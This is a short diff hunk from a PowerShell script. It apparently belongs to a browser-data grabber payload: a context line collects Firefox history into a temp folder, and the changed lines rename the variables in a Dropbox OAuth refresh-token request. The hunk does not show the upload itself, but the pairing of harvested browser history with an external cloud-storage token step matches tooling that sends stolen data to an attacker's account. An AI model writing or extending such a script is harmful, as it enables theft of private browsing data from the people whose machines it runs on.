@@ -511,9 +511,9 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\B
 
 $Body = @{
     grant_type    = "refresh_token"
-    refresh_token = $refresh
-    client_id     = $key
-    client_secret = $secret
+    refresh_token = $refresh_token
+    client_id     = $app_key
+    client_secret = $app_secret
 }
 
 $response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded"
